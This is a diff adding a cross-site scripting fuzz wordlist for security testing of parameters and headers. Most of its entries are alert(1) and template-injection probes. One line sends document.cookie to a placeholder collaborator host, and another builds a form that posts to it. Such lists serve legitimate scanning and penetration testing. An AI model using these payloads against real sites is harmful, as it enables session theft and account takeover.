@@ -1,0 +1,29 @@
+# Cross-site scripting fuzz tokens.
+# provenance: SECLISTS@master@2026-01-14 + PAT@master@2026-01-15
+# surface: parameter / header   cwe: CWE-79
+<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+</script><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" onfocus=alert(1) autofocus="
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+'-alert(1)-'
+";alert(1);//
+\");alert(1);//
+{{7*7}}
+${7*7}}
+<%25=7*7%25>
+{{constructor.constructor('alert(1)')()}}
+<img src=x onerror=fetch('//COLLAB/?c='+document.cookie)>
+<form action="//COLLAB"><input name=c><input type=submit>
